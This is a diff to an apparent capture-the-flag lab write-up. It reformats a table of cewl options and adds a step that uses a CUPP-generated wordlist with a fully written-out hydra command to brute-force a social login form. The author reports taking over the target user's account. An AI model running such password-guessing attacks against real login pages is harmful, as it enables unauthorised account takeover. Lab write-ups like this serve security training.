@@ -199,16 +199,15 @@ cewl -d 2 -m 3 --lowercase --with-numbers \
 http://10.49.177.247:5002
 ```
 Options Used
-```
-Option	               Purpose
 
-- -d 2	              Crawl up to depth 2
-- -m 3	              Minimum word length of 3
-- --lowercase	        Convert extracted words to lowercase
-- --with-numbers	    Include words containing numbers
-- -w	                Save output to a wordlist
+| Option | Purpose
+|---|---|
+| -d 2	             | Crawl up to depth 2
+| -m 3	             | Minimum word length of 3
+| --lowercase	       | Convert extracted words to lowercase
+| --with-numbers	   | Include words containing numbers
+| -w	               | Save output to a wordlist
 
-```
 This produced:
 ```
 5002_words.txt
@@ -280,4 +279,30 @@ CUPP generated:
 containing combinations based on the supplied information.
 
 ![level 1](screenshot/cupptool.png)
+
+## Step 3 — Hydra Against the Social Login
+
+I used the generated wordlist against the login form:
+```
+hydra -l marco \
+-P marco.txt \
+-s 5003 \
+-f \
+-t 4 \
+social.thm \
+http-post-form \
+"/login:username=^USER^&password=^PASS^:F=invalid"
+```
+Important Options
+- -l marco → target username
+- -P marco.txt → CUPP-generated wordlist
+- -s 5003 → target port
+- -f → stop after finding a valid credential
+- -t 4 → use four parallel tasks
+
+Hydra successfully found a valid credential.
+
+After authentication, I gained access to Marco's social media account.
+
+
 
